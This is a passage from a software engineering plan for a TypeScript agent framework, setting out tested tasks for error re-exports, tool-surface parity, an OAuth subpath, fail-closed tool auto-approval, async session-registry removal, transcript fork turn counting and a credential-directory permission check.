- No source file changes. `errors.ts` (18 LOC, `ee9fb7b1`) and `index.ts` (367 LOC, `7667597a`) are **read** by the test and not modified, so the 35K bundle ceiling is untouched — the v1.1 concern about the ceiling is moot.
- The capability-index row is guarded by T0.1's corrected parser, which is why T0.1 must land first for this row to be checkable (see EC-2: the uncorrected parser would reject this very row, since the symbol arrives through a star).

#### Deep Dives
- **Invariant.** `instanceof` holds across the seam because the star forwards the *same class object*, not a copy. The test asserts identity, not merely presence: an error constructed by SDK code satisfies `instanceof` the class imported from the layer.
- **Invariant.** The test must import from the **published entry** (`dist`), not from `src`. Importing from source would pass even if the build dropped the forward, which is the failure mode being pinned.
- **Edge case.** `dist` unbuilt → skip with a reason, reusing the existing `noteSkip` convention rather than failing (EC-22's rule, applied here too).

#### Tasks
1. Write the test importing both symbols from the built package entry.
2. Assert `instanceof` identity using an error produced by SDK code.
3. Add the capability-index row: `Catch any framework error by base class | TheokitAgentError | @theokit/agents | (already shipping — via the errors star forward)`.
4. Reclassify gap 16 in the database: `status = 'invalid'`, with the corrected finding recorded so the next cross-validation does not re-derive it.
5. Record the technique lesson where it belongs — T0.1's rationale (a reachability claim is only valid if the method follows `export *`).

#### TDD
```
RED:     test_base_error_is_importable_from_the_published_entry() — fails only if the star forward is removed
RED:     test_sdk_thrown_error_is_instanceof_the_symbol_imported_from_the_layer() — identity, not presence
RED:     test_is_transient_error_is_reachable_from_the_layer()
RED:     test_unbuilt_dist_skips_with_a_reason() — EC-22 convention
GREEN:   (already green — this task PINS existing behaviour; the RED phase is proven by
         temporarily removing the star forward locally and observing the failure, then restoring it)
REFACTOR: None expected
VERIFY:  pnpm --filter @theokit/agents vitest run tests/unit/error-base-reachable.test.ts
```

> **On the RED phase.** This is the one task in the plan whose test does not start red against unmodified code, because the behaviour already works. Writing it green would violate `rules/testing.md § 3`, so the RED is produced by deleting `export * from '@theokit/sdk/errors'` from the built entry, observing all three assertions fail, and restoring it. That is a real mutation check and it is what proves the test would catch the regression it exists for.

#### Concurrency tests

(none — single-threaded)

#### Acceptance Criteria
- [ ] All three assertions pass — `pnpm --filter @theokit/agents vitest run tests/unit/error-base-reachable.test.ts` exits 0.
- [ ] Mutation check performed — deleting `export * from '@theokit/sdk/errors'` from `dist/index.d.ts` turns all three assertions red, and the line is restored.
- [ ] The capability-index row resolves — `pnpm vitest run tests/integration/crossval-gaps.test.ts` exits 0 with the row present.
- [ ] Gap 16 reclassified — `sqlite3 cross-validation-output/cross-validation.db "SELECT status FROM gaps WHERE id=16"` returns `invalid`.
- [ ] **No re-export was added** — `git diff packages/agents/src/` is empty for this task.

#### DoD
- [ ] `pnpm --filter @theokit/agents test` green.
- [ ] `CHANGELOG.md` `[Unreleased] § Fixed` recording the corrected measurement, not a new capability.

### T1.2 — Cross the three `view-image` symbols, or write the reason

#### Objective
`createViewImageTool`, `CreateViewImageToolOptions` and `DEFAULT_MAX_IMAGE_BYTES` either cross into `@theokit/agents/tools` or carry a written withholding reason, and the 93-symbol parity claim is re-measured.

#### Why this step (action + reasoning)

**What this step does.** Compares the SDK factory's output shape against the consumer's local `view-image.ts`, then either adds the three names to `tools-entry.ts` or writes the reason where the file's own rule says it must go.

**Why it is necessary now.** `tools-entry.ts:18-20` claims *"The surface is preserved WHOLE (measured: 93 symbols, parity identical to the source)"* and sets the rule *"If a symbol is ever deliberately withheld, the reason comes written here."* Three symbols contradict the claim and no reason is written. The consequence is measured: `view-image.ts` is 49 LOC and **the only local tool** in a 10-tool registry where the other 9 are framework built-ins. This is the cleanest cause-and-effect the cross-validation found. Cites D6 and Risk R8.

#### Evidence
- `packages/agents/src/tools-entry.ts:18` — the parity claim, verbatim.
- `grep -c createViewImageTool packages/agents/dist/tools.d.ts` → `0`; the symbol is present in `../theokit-sdk/packages/sdk-tools/dist/index.d.ts`.
- `TheoCode/packages/agent/src/tools/registry.ts:2` — `import { createViewImageTool } from './view-image.js'` — the local one, wired at `:86`.
- `TheoCode/packages/agent/src/tools/view-image.ts` — 49 LOC, schema at `:35-40`, `outputSchema`/`toModelOutput` split at `:41-63`.

#### Files to edit
```
packages/agents/src/tools-entry.ts — add the three names, or the written reason; re-measure the symbol count
packages/agents/tests/unit/tools-surface-parity.test.ts — extend to assert the count claim matches reality
```

#### Deep file dependency analysis
- `tools-entry.ts` (134 LOC, `ca70a9ca`) is the `./tools` subpath entry, generated by `scripts/generate-reexports.mts` and pinned by `tests/unit/subpath-surface.test.ts` (stated at `:23`). Regenerating rather than hand-editing is the correct move; the task runs the generator.
- Downstream: `TheoCode/packages/agent/src/tools/registry.ts` consumes `./tools`. Adding names cannot break it.

#### Deep Dives
- **The decision gate.** Before crossing, assert the SDK factory returns an image content block with the same shape the consumer's local tool returns. If it does not, the task **stops** and the divergence is filed as a finding — crossing a differently-shaped factory would silently change what the model receives (Risk R8).
- **The count claim.** `93 symbols` is currently false by three. After crossing, re-run the generator and write the measured number; do not leave a hand-maintained figure.

#### Tasks
1. Write the RED test asserting shape equivalence between the SDK factory's output and the consumer's local tool's output.
2. If shapes match, run `scripts/generate-reexports.mts` so the three names cross.
3. If shapes diverge, stop; write the divergence as the withholding reason at `tools-entry.ts:20` and file it.
4. Re-measure the symbol count and update the comment with the measured value.
5. Add a capability-index row for the image tool.

#### TDD
```
RED:     test_sdk_view_image_returns_the_same_content_block_shape() — compares against the consumer's tool as spec
RED:     test_tools_entry_symbol_count_matches_measurement() — fails today (93 claimed, 90 crossing)
RED:     test_unbuilt_dist_skips_with_a_reason_and_does_not_report_parity() — EC-22, reuse the noteSkip convention
GREEN:   cross the three names (or write the reason) and correct the count
REFACTOR: None expected
VERIFY:  pnpm --filter @theokit/agents vitest run tests/unit/tools-surface-parity.test.ts
```

#### Concurrency tests

(none — single-threaded)

#### Acceptance Criteria
- [ ] `packages/agents/dist/tools.d.ts` contains all three names, OR `tools-entry.ts` carries a written reason naming each.
- [ ] The symbol-count comment matches reality — `pnpm --filter @theokit/agents vitest run tests/unit/tools-surface-parity.test.ts` exits 0.
- [ ] Shape equivalence asserted by `sdk_view_image_returns_the_same_content_block_shape()`, or the divergence filed as an issue with the diff attached.
- [ ] Pass: size — `wc -l packages/agents/src/tools-entry.ts` under 500.

#### DoD
- [ ] `pnpm --filter @theokit/agents test` green.
- [ ] `pnpm check:surface-parity` green.
- [ ] `CHANGELOG.md` `[Unreleased] § Added`.

### T1.3 — Publish the MCP OAuth subpath

#### Objective
`runPkceFlow` and `refreshAccessToken` are reachable from a published package, or the capability index states plainly that they are internal.

#### Why this step (action + reasoning)

**What this step does.** Adds `./mcp-auth` (or the equivalent) to the SDK's `exports` map and `tsup.config.ts` entry list, then adds the capability-index row.

**Why it is necessary now.** 286 tested lines of MCP PKCE + refresh exist at `internal/mcp/oauth.ts` and are reachable from no package, while the capability index records the capability as *"no implementation in `packages/`"*. A customer building EmpresaCode against a remote MCP server that requires OAuth writes PKCE by hand. *"Implemented, not published"* is a materially cheaper fix than *"not implemented"*, and the index currently prescribes the expensive one. Cites D6.

#### Evidence
- `../theokit-sdk/packages/sdk/src/internal/mcp/oauth.ts` — 286 LOC exporting `runPkceFlow` and `refreshAccessToken`, with `token-storage.ts` alongside.
- `internal/mcp` appears in neither `../theokit-sdk/packages/sdk/package.json` `exports` (431 LOC) nor `tsup.config.ts` (123 LOC).
- `wiki/capability-index.md § Honest gaps` — records it as unimplemented.

#### Files to edit
```
../theokit-sdk/packages/sdk/package.json — add the subpath to exports
../theokit-sdk/packages/sdk/tsup.config.ts — add the entry so the subpath builds
../theokit-sdk/packages/sdk/tests/mcp-auth-subpath.test.ts (NEW) — RED first
wiki/capability-index.md — replace the Honest-gaps row with a real row
```

#### Deep file dependency analysis
- The SDK's `exports` map (431 LOC) is consumed by every package in the ecosystem; adding a subpath cannot break existing resolution. `tsup.config.ts` must gain the matching entry or the subpath resolves to a file that is never built — the failure mode `@theokit/di-agent` currently exhibits (gap 25).
- Downstream: `@theokit/agents` may then choose to forward it; that forwarding decision belongs to T4.2's boundary audit, not here.

#### Deep Dives
- **Invariant.** Publishing must not widen what `internal/` means elsewhere: only the `mcp` folder's OAuth entry is promoted. The rest of `src/internal/` (69% of the SDK by LOC) stays internal.
- **Edge case.** If the module imports other `internal/` symbols transitively, publishing the entry drags them into the public bundle. The task measures the transitive closure before adding the entry, and if the closure is wide, the honest outcome is the index correction alone (*"internal"*), not a forced publish.

#### Tasks
1. Measure the transitive import closure of `internal/mcp/oauth.ts`.
2. Write the RED test importing the subpath from the built package.
3. If the closure is narrow, add the `exports` entry and the `tsup` entry.
4. If the closure is wide, correct the capability index to say "internal — not consumable" and file the widening as future work.
5. Update the capability-index row either way.

#### TDD
```
RED:     test_mcp_oauth_subpath_resolves_from_the_built_package() — import fails today
GREEN:   add exports + tsup entries (or take the honest-index path)
REFACTOR: None expected
VERIFY:  cd ../theokit-sdk && pnpm --filter @theokit/sdk test
```

#### Concurrency tests

(none — single-threaded)

#### Acceptance Criteria
- [ ] Either `node -e "import('@theokit/sdk/mcp-auth')"` resolves, or `wiki/capability-index.md` says "internal" with the measured closure size as the reason.
- [ ] `tsup` emits the entry (no exports row pointing at an unbuilt file).
- [ ] Pass: size — changed files under 500 lines, per `wc -l` on the changed set.

#### DoD
- [ ] `cd ../theokit-sdk && pnpm test` green.
- [ ] SDK `CHANGELOG.md` `[Unreleased]` entry.

---

## Phase 2: The shapes that were wrong

**Objective:** change four framework signatures so the only real consumer can use them.

### T2.1 — Export a callable auto-approve decision and the `ApprovalMode` vocabulary

#### Objective
A surface can ask *"may I auto-approve this tool now?"* through a framework symbol, and `ApprovalMode` exists in the framework.

#### Why this step (action + reasoning)

**What this step does.** Extracts the refusal rule inside `applyPosture` into a pure predicate in a new module, exports it plus `ApprovalMode` from `./bridge`, and leaves `applyPosture` calling the same predicate so there is one implementation.

**Why it is necessary now.** `approval-posture.ts:69-72` asserts in writing that the rule now lives once and names the consumer's duplication a G12 violation. It does not live once: `bridge/index.ts:70` exports only the type, `applyPosture` (`:116`) is re-exported nowhere, and its signature `(extra, m8, posturePolicy, gated)` mutates an options bag — it answers *"construct this agent with a gate?"*, not the per-event question a TUI asks. Both consumer copies survive, one modified **2026-08-15**. Cites D3, D5, D6.

#### Evidence
- `packages/agents/src/bridge/approval-posture.ts:69-72` — the G12 note naming `shouldAutoApprove` and `resolveHeadlessApproval`.
- `packages/agents/src/bridge/approval-posture.ts:173-182` — the fail-closed refusal when `confinedBy.enforced` is false, with the message quoting `detail`.
- `packages/agents/src/bridge/index.ts:70` — `export type { ApprovalPosture }`.
- `TheoCode/packages/tui/src/consent/approval-mode.ts:22-33` — `shouldAutoApprove(mode, toolName, posture)`, and `:8-20` records B-006: *"An absent posture counts as unconfined. Absence of evidence is not evidence of confinement."*
- `TheoCode/packages/agent/src/config/approval-policy.ts` — 56 LOC, the second copy.
- `grep -rn "ApprovalMode" packages/agents/src` → zero.

#### Files to edit
```
packages/agents/src/bridge/approval-decision.ts (NEW) — ApprovalMode + the pure predicate
packages/agents/src/bridge/approval-posture.ts — applyPosture delegates to the predicate
packages/agents/src/bridge/index.ts — export both
packages/agents/tests/unit/approval-decision.test.ts (NEW) — RED first, carrying the B-006 scar
```

#### Deep file dependency analysis
- `approval-posture.ts` (220 LOC, `3b5941ab`): `applyPosture` has one production caller, `bridge/sdk-adapter.ts:684`, and four test call sites. Delegating its refusal to a predicate keeps the caller untouched — the refusal must still throw from `applyPosture` with the same message, because `approval-posture-evidence.test.ts` asserts it.
- `bridge/index.ts` (177 LOC, `1ab7b498`): adding two exports; no narrowing.

#### Deep Dives
- **The predicate's shape.** `shouldAutoApprove(mode, toolName, posture?)` mirrors what the consumer proved it needs, and the SAFE direction on omission is preserved: an absent posture returns `false`. `codex`'s `GranularApprovalConfig` resolves an absent field to auto-REJECT and `opencode` resolves an absent rule to `ask` — the same direction, cited in `approval-posture.ts:20-23`.
- **Invariant (scar tissue, D5).** `full-auto` returns true **only** when `posture.enforced === true`. `auto-edit` returns true only for tools bounded by their own write scope. `suggest` always returns false. An absent posture is unconfined.
- **Invariant (existing).** `applyPosture`'s throw must not change message or timing — it is the runtime backstop for a caller who casts past the type.
- **Edge case.** A tool name unknown to the mode table under `auto-edit` → `false`, never `true`. Defaulting the other way silently opens the gate anywhere a name has not been threaded through, which is the B-006 failure verbatim.

#### Pseudo-code / Signatures
```pseudocode
export type ApprovalMode = 'suggest' | 'auto-edit' | 'full-auto'

export function shouldAutoApprove(
  mode: ApprovalMode,
  toolName: string,
  posture?: SandboxPosture,
): boolean
  switch mode:
    case 'suggest':   return false
    case 'auto-edit': return TOOLS_BOUNDED_BY_WRITE_SCOPE.has(toolName)
    case 'full-auto': return posture?.enforced === true      -- absent ⇒ unconfined ⇒ false

# Example
input:  ('full-auto', 'run_shell', undefined)
output: false        # B-006: absence of evidence is not evidence of confinement
input:  ('full-auto', 'run_shell', { enforced: true, mode: 'bwrap', detail: 'kernel' })
output: true
```

#### Tasks
1. Write the RED tests, including the B-006 absent-posture case and the unknown-tool case.
2. Create `approval-decision.ts` with `ApprovalMode` and the predicate.
3. Rewrite `applyPosture`'s `auto-approve` branch to consult the predicate, preserving its throw.
4. Export both from `bridge/index.ts`.
5. Add the capability-index row.

#### TDD
```
RED:     test_absent_posture_never_auto_approves() — the B-006 scar
RED:     test_full_auto_requires_enforced_confinement()
RED:     test_auto_edit_only_covers_write_scoped_tools()
RED:     test_unknown_tool_under_auto_edit_is_refused()
RED:     test_apply_posture_still_throws_on_unenforced_confinement() — regression on the existing invariant
GREEN:   implement the predicate and delegate
REFACTOR: None expected
VERIFY:  pnpm --filter @theokit/agents vitest run tests/unit/approval-decision.test.ts tests/unit/approval-posture-evidence.test.ts
```

#### Concurrency tests

(none — single-threaded)
The predicate is pure over its arguments and holds no state. `applyPosture` mutates an options bag that is constructed per-agent and never shared across turns (`sdk-adapter.ts:684` — one call per factory construction), so there is no concurrent writer to race with.

#### Acceptance Criteria
- [ ] `import { shouldAutoApprove, type ApprovalMode } from '@theokit/agents/bridge'` resolves.
- [ ] The B-006 invariant holds: absent posture ⇒ `false`, asserted directly.
- [ ] `applyPosture`'s existing throw is byte-identical in message.
- [ ] One implementation of the rule — `grep` finds the enforcement in exactly one module.
- [ ] Pass: complexity — the predicate under 10 cyclomatic, reported by `pnpm lint` (complexity rule).

#### DoD
- [ ] `pnpm --filter @theokit/agents test` green (1328+ passing baseline maintained).
- [ ] `CHANGELOG.md` `[Unreleased] § Added`.

### T2.2 — Give the GC an async registry-remover seam

#### Objective
`runTranscriptGC` accepts a registry remover, and both it and `deleteSession` accept an async one.

#### Why this step (action + reasoning)

**What this step does.** Adds an optional `removeFromRegistry?: (id: string) => Promise<void> | void` to `runTranscriptGC`'s options, and widens `deleteSession`'s remover to accept a thenable **while keeping the silent-success refusal** by awaiting rather than rejecting.

**Why it is necessary now.** `runTranscriptGC` deletes transcript files and leaves the agent registry untouched — it has no remover at all. Its sibling `deleteSession` takes one but refuses a thenable at `:236-239` (correctly: a Promise is truthy, and the old code reported `registryRemoved: true` before the removal happened). And the only agent registry in the ecosystem is `Agent.delete(id): Promise<void>`. So a correct bug fix hardened the seam against the only implementation that can satisfy it, and the registry half of session deletion is unreachable through every exported symbol. Cites D5, D6.

#### Evidence
- `packages/agents/src/session/session-lifecycle.ts:236-239` — the `SessionRegistryRemoverError` throw, landed by `b023cef8` (2026-08-15).
- `packages/agents/src/session/gc/transcript-gc.ts:237` — `runTranscriptGC` signature with no remover; `:263` `rmSync`.
- `@theokit/sdk` `dist/index.d.ts:782` — `Agent.delete(id): Promise<void>`.
- `TheoCode/packages/agent/src/session/gc/all-sessions.ts` — 442 LOC doing what the framework's shape cannot express.

#### Files to edit
```
packages/agents/src/session/gc/registry-remover.ts (NEW) — the shared awaiting helper
packages/agents/src/session/gc/transcript-gc.ts — accept the remover; await it
packages/agents/src/session/session-lifecycle.ts — accept a thenable by awaiting, keep the silent-success guarantee
packages/agents/src/session/index.ts — export the remover type
packages/agents/tests/unit/gc-registry-remover.test.ts (NEW) — RED first
```

#### Deep file dependency analysis
- `session-lifecycle.ts` (333 LOC, `b023cef8`): `deleteSession` has no in-repo production callers and four test call sites; the external consumer is TheoCode's `session-ops.ts`. Widening a signature to accept more is source-compatible for every existing caller.
- `transcript-gc.ts` (275 LOC, `3ceeaf4d`): the 4 GC invariants and `GCFloorError` must survive; dry-run stays the default (`Invariants to preserve`).

#### Deep Dives
- **Invariant (the scar being preserved, D5).** `registryRemoved: true` MUST NOT be reported before the removal actually completed. The old bug was reporting on truthiness; the fix was refusing thenables; the correct end state is **awaiting** them. The refusal is replaced by an await, not deleted — and a synchronous remover that throws still surfaces.
- **Invariant — ORDER: registry first, unlink second (EC-3).** v1.1 left the order unstated while its prose assumed file-first. File-first is the wrong choice: if the registry removal then fails, the registry holds an entry pointing at a transcript that no longer exists, and `Agent.list` / `sessionHasWriter` report a session whose file is gone — a state **no later GC run repairs**, because GC works from transcripts and this entry has none. Registry-first fails the other way: an orphan transcript file with no registry entry, which the *next* sweep collects. One failure mode is recoverable and the other is not, so the order is not a preference.
- **Invariant.** Dry-run remains the default; a remover supplied under dry-run is never called.
- **Edge case.** A remover that rejects: the transcript file is **still present** (registry-first). The result reports the registry failure and the un-deleted file **separately**, never collapsed into one boolean — collapsing is how the original bug hid.
- **Edge case.** A remover that never settles: bounded by a timeout, surfaced as a typed error rather than a hang.
- **Edge case (EC-8).** The timeout fires and the remover settles successfully afterwards. The result stays `registryRemoved: false` — wrong in the safe direction, which is acceptable. What is not acceptable is the late resolution mutating an already-returned result object; the result must be constructed once and never written to after return.

#### Pseudo-code / Signatures
```pseudocode
export type RegistryRemover = (sessionId: string) => Promise<void> | void

async function deleteOne(id: string, remove: RegistryRemover | undefined, timeoutMs: number): Result
  -- EC-3: REGISTRY FIRST. A failure here leaves a recoverable orphan file;
  -- the reverse leaves a registry entry no GC run can ever repair.
  registry = { registryRemoved: false, registryError: undefined }
  if remove:
    try:
      await withTimeout(remove(id), timeoutMs)     -- await handles BOTH shapes; the old refusal
      registry.registryRemoved = true              -- existed only because truthiness was checked
    catch e:
      registry.registryError = e
      return freeze({ ...registry, fileDeleted: false })   -- file untouched, both facts separate
  unlink(transcriptPath(id))
  return freeze({ ...registry, fileDeleted: true })        -- frozen: a late settle cannot mutate it

# Example
input:  remover = (id) => Agent.delete(id)   # returns Promise<void>
output: { registryRemoved: true, fileDeleted: true }   # today: throws SessionRegistryRemoverError
input:  remover rejects
output: { registryRemoved: false, registryError: e, fileDeleted: false }   # orphan-free, recoverable
```

#### Tasks
1. Write the RED tests, including the async remover and the reject-after-unlink case.
2. Create `registry-remover.ts` with the awaiting helper and the timeout.
3. Wire it into `deleteSession`, replacing the thenable refusal with an await.
4. Add the optional remover to `runTranscriptGC` and wire the same helper.
5. Export `RegistryRemover` from `./session`.
6. Add the capability-index row.

#### TDD
```
RED:     test_async_remover_is_awaited_not_refused() — Agent.delete-shaped remover succeeds
RED:     test_sync_remover_still_works() — backward compatibility
RED:     test_registry_failure_is_reported_separately_from_file_deletion() — the scar: no collapsed boolean
RED:     test_registry_removed_before_the_file_is_unlinked() — EC-3: a rejecting remover leaves the file PRESENT
RED:     test_remover_that_never_settles_times_out_with_a_typed_error()
RED:     test_remover_that_settles_after_the_timeout_does_not_mutate_the_returned_result() — EC-8
RED:     test_dry_run_never_calls_the_remover()
RED:     test_run_transcript_gc_accepts_a_remover()
GREEN:   implement the helper and wire both call sites
REFACTOR: None expected
VERIFY:  pnpm --filter @theokit/agents vitest run tests/unit/gc-registry-remover.test.ts tests/unit/session-lifecycle.test.ts tests/unit/transcript-gc-protection.test.ts
```

#### Concurrency tests
This task introduces `await` over a caller-supplied function inside a sweep that processes many sessions.

- **Cancellation / timeout** — `remover_that_never_settles_times_out_with_a_typed_error()` asserts the timeout fires and the sweep continues rather than hanging.
- **Atomic-counter invariant** — a sweep over N sessions with a remover incrementing a counter asserts the final count equals the number of sessions actually deleted, and that a rejecting remover on session *k* does not prevent sessions *k+1..N* from being processed.
- **Happens-before observation** — assert `registryRemoved: true` is observed only after the remover's promise has settled, by having the remover resolve on an explicit barrier the test controls.

#### Acceptance Criteria
- [ ] A remover returning `Promise<void>` is awaited and reported truthfully.
- [ ] A rejecting remover returns `{ registryRemoved: false, fileDeleted: false }` — two distinct fields, asserted by `registry_removed_before_the_file_is_unlinked()`.
- [ ] `runTranscriptGC` accepts and honours a remover.
- [ ] The 4 GC invariants and `GCFloorError` unchanged, asserted by the existing suite.
- [ ] Pass: coverage — `pnpm test:coverage` reports over 90% on changed files and 100% on the registry-failure branch.

#### DoD
- [ ] `pnpm --filter @theokit/agents test` green.
- [ ] `pnpm typecheck` zero errors.
- [ ] `CHANGELOG.md` `[Unreleased] § Fixed` naming the async-remover defect.

### T2.3 — Make `forkBeforeUserTurn` count turns a real transcript has

#### Objective
Forking before the Nth user turn lands on the turn the user sees, on a transcript containing tool results and a `compact_boundary`.

#### Why this step (action + reasoning)

**What this step does.** Changes turn counting to skip non-turn `user`-typed records and to start after the last `compact_boundary`, and returns the selected turn's text alongside the record index.

**Why it is necessary now.** This is the only **defect** in the plan, not a gap: `session-lifecycle.ts:325-331` counts every `record.type === 'user'` from index 0. Tool results and synthetic continuations are user-typed records, and everything before `compact_boundary` has left the window. The fork **succeeds at the wrong turn**, silently — the worst failure shape, since nothing errors. The consumer's `session/backtrack.ts:88-103` encodes all three corrections, which is the specification. Cites D5, D6.

#### Evidence
- `packages/agents/src/session/session-lifecycle.ts:325-331` — `recordIndexOfUserTurn` counting all `type === 'user'`.
- `TheoCode/packages/agent/src/session/backtrack.ts:88-103` — the three corrections (skip non-turn, respect `compact_boundary`, skip goal-continuation markers), 175 LOC.
- `packages/agents/tests/unit/session-fork.test.ts:83,89,98` — the existing suite, whose fixtures contain no tool results and no boundary, which is why it is green.
- `TheoCode/packages/tui/src/backtrack/backtrack.ts:36` — the consumer re-seeds the composer with the selected text, which the framework's `{transcript, recordIndex}` return cannot supply.

#### Files to edit
```
packages/agents/src/session/session-lifecycle.ts — turn counting + return the selected text + readUserTurnPreviews
packages/agents/src/session/index.ts — export readUserTurnPreviews
packages/agents/tests/unit/session-fork.test.ts — extend fixtures with tool results and a compact_boundary (RED)
```

**v1.1 scope addition.** `readUserTurnPreviews` ships here rather than as a separate task: it answers the same question as the corrected counting (*which records are the reachable user turns?*) over the same scan, and splitting them would leave two implementations of the turn predicate — the DRY violation `rules/system-design-guardrails.md § G12` names. The consumer's `backtrack.ts:36` needs previews to render the rewind ladder, and its `readUserTurnPreviewsAsync` is the wrapper this replaces.

#### Deep file dependency analysis
- `session-lifecycle.ts` (333 LOC, `b023cef8`): `forkBeforeUserTurn` has zero in-repo production callers and three test call sites; the external consumer is TheoCode via `forkSessionBeforeUserTurn`. `nth` stays 1-based (`Invariants to preserve`); truncation stays delegated to the SDK's `forkTranscript`.
- The return type widens from `{transcript, recordIndex}` to add `selectedText` — additive, source-compatible.

#### Deep Dives
- **Invariant.** `nth` is 1-based and counts what a **user** would call their Nth message, not what the transcript calls a `user` record.
- **Invariant (EC-5).** `nth < 1` is rejected at entry with a **distinct** typed error. Falling through to the exceeded-error would produce "turn 0 exceeds the 5 reachable turns", which is nonsense — and 0 is the *likely* mistake, because record indices in the same module are 0-based. Two different wrongs need two different messages.
- **Algorithm.** (1) Reject `nth < 1`. (2) Find the **last** `compact_boundary` index; start scanning after it. (3) Walk forward, counting only records that are genuine user turns — excluding tool results and continuation markers. (4) The Nth such record's index is the fork point. (5) Extract its text for `selectedText`.
- **Edge case.** `nth` larger than the number of reachable turns → a typed error naming how many are reachable, not a silent fork at the end.
- **Edge case.** A transcript with no `compact_boundary` → behaviour identical to today for turn selection, which is why the existing suite stays green.
- **Edge case.** A transcript that is entirely pre-boundary → zero reachable turns; refuse with the typed error.
- **Edge case (EC-14).** **Several** `compact_boundary` markers → `lastIndexOf`, so counting starts after the most recent one. A boundary as the **final** record → start index equals the record count, zero reachable turns, and the typed error must name **zero** rather than landing off-by-one on the boundary record itself.

#### Pseudo-code / Signatures
```pseudocode
function recordIndexOfUserTurn(records: SessionRecord[], nth: number): number
  if nth < 1: throw InvalidTurnOrdinalError(nth)        -- EC-5: distinct from "exceeded"
  start = lastIndexOf(records, r => r.type === 'compact_boundary') + 1
  seen = 0
  for i from start to records.length - 1:
    if not isGenuineUserTurn(records[i]): continue      -- excludes tool results, continuation markers
    seen += 1
    if seen === nth: return i
  throw ReachableTurnsExceededError(nth, seen)

# Example — transcript: [user, tool_result, user, compact_boundary, user, tool_result, user]
nth=1  → index 4   (today: index 0 — the wrong turn, silently)
nth=2  → index 6
nth=3  → ReachableTurnsExceededError(3, 2)
nth=0  → InvalidTurnOrdinalError(0)                      -- EC-5, not "0 exceeds 2"
# Example — boundary as the final record: [user, user, compact_boundary]
nth=1  → ReachableTurnsExceededError(1, 0)               -- EC-14: names ZERO, no off-by-one
```

#### Tasks
1. Extend the fixture with tool results, a continuation marker and a `compact_boundary` (RED — current code picks the wrong index).
2. Implement the boundary-aware, turn-aware counting.
3. Add `selectedText` to the return.
4. Add the typed `ReachableTurnsExceededError` extending `TheokitAgentError`.
5. Add the capability-index row.

#### TDD
```
RED:     test_fork_skips_tool_result_records_when_counting_turns()
RED:     test_fork_starts_after_the_last_compact_boundary()
RED:     test_fork_skips_goal_continuation_markers()
RED:     test_fork_returns_the_selected_turn_text()
RED:     test_nth_beyond_reachable_turns_raises_a_typed_error_naming_the_count()
RED:     test_transcript_without_a_boundary_behaves_as_before() — regression
RED:     test_previews_list_exactly_the_reachable_turns_in_order() — readUserTurnPreviews, same predicate
RED:     test_previews_and_fork_agree_on_which_turn_is_nth() — the two share one predicate, asserted
RED:     nth_below_one_raises_InvalidTurnOrdinalError_not_the_exceeded_error() — EC-5
RED:     counting_starts_after_the_LAST_boundary_when_several_are_present() — EC-14
RED:     test_boundary_as_the_final_record_names_zero_reachable_turns() — EC-14
GREEN:   implement the three corrections
REFACTOR: None expected
VERIFY:  pnpm --filter @theokit/agents vitest run tests/unit/session-fork.test.ts
```

#### Concurrency tests

(none — single-threaded)
Turn counting is a pure scan over an already-loaded record array.

#### Acceptance Criteria
- [ ] On a fixture with tool results and a boundary, `nth=1` returns the first post-boundary genuine turn.
- [ ] `selectedText` is the text of the selected turn.
- [ ] Beyond-range raises `ReachableTurnsExceededError` whose message contains the reachable count.
- [ ] Existing boundary-free fixtures behave identically — `pnpm --filter @theokit/agents vitest run tests/unit/session-fork.test.ts` exits 0 with the pre-existing cases unchanged.
- [ ] Pass: complexity — the counting function under 10 cyclomatic, reported by `pnpm lint`.

#### DoD
- [ ] `pnpm --filter @theokit/agents test` green.
- [ ] `CHANGELOG.md` `[Unreleased] § Fixed` describing the wrong-turn defect in consumer-facing language.

### T2.4 — Resolve the `assertSecureModes` mask against the directory the framework creates

#### Objective
The exported permission check does not refuse the directory mode the framework's own layout produces.

#### Why this step (action + reasoning)

**What this step does.** Answers Q3, then either narrows the mask to world-write or tightens directory creation to 0700 — and adds a test asserting the two agree.

**Why it is necessary now.** U-4 asked for the check to stop being private and it is now exported. But its directory gate masks `& 0o022`, refusing group-write, while `~/.theokit` is created 0775 under the default umask 002 on a Linux desktop. **The framework ships a check its own layout fails.** A consumer adopting it would refuse to start. The consumer measured this and narrowed its own gate to world-write, with two tests covering both directions. Cites D5, D6.

#### Evidence
- `packages/agents/src/auth-entry.ts:31` — `assertSecureModes` on the `./auth` subpath; implementation at `../theokit-sdk/.../credential-store.ts:122-137`.
- `TheoCode/packages/agent/src/config/trust-store.ts:39-49` — narrowed to world-write on measurement; *"umask 002 yields 0775; `~/.theokit` is 0775 on a real machine"*, covered both ways by two tests.
- `scripts/check-surface-parity.mjs:122-125` — the written decision that `assertSecureModes` is re-exported *because* withholding it would leave the consumer restating a security rule.

#### Files to edit
```
../theokit-sdk/packages/sdk/src/internal/auth/credential-store.ts — the mask, or the creation mode
../theokit-sdk/packages/sdk/tests/credential-store-modes.test.ts — RED first, both directions
```

#### Deep file dependency analysis
- The check is consumed through `@theokit/agents/auth`'s re-export; changing the mask changes behaviour for every consumer of that subpath. There are no in-repo production callers; the external consumer is TheoCode's trust store, which currently does **not** use it (that is the gap).
- If the decision is to tighten creation to 0700 instead, every code path that creates the credential home must change together, or the check and the creator disagree in the other direction.

#### Deep Dives
- **Invariant (whichever answer Q3 takes).** The check and the directory creator MUST agree, asserted by a test that creates the directory the way the framework does and then runs the check on it. That test is the real deliverable; the mask value is the parameter.
- **Edge case.** A pre-existing 0775 directory created by an older version: if the decision tightens to 0700, adoption must either repair the mode or refuse with a message naming the repair command — refusing with no path forward is the failure U-4 already caused.
- **Security note.** Narrowing to world-write is a genuine relaxation and must be recorded as such, with the reasoning that a group-writable home under umask 002 is the platform default rather than a misconfiguration.

#### Tasks
1. Obtain the Q3 answer from the owner (blocking).
2. Write the RED test that creates the credential home the way the framework does, then runs the check.
3. Implement the chosen side.
4. If tightening, add the repair path for pre-existing directories.
5. Record the security reasoning in the module's docstring.

#### TDD
```
RED:     test_the_check_accepts_a_home_created_by_this_framework() — fails today (0775 vs & 0o022)
RED:     test_a_world_writable_home_is_still_refused() — the guarantee that must not be lost
RED:     test_pre_existing_wrong_mode_is_repaired_or_named() — only when tightening
RED:     test_a_symlinked_home_is_checked_on_its_target_not_on_the_link() — EC-15
RED:     test_an_absent_home_is_not_reported_as_an_insecure_home() — EC-16, first run on a clean machine
GREEN:   implement the chosen side
REFACTOR: None expected
VERIFY:  cd ../theokit-sdk && pnpm --filter @theokit/sdk vitest run tests/credential-store-modes.test.ts
```

#### Concurrency tests

(none — single-threaded)

#### Acceptance Criteria
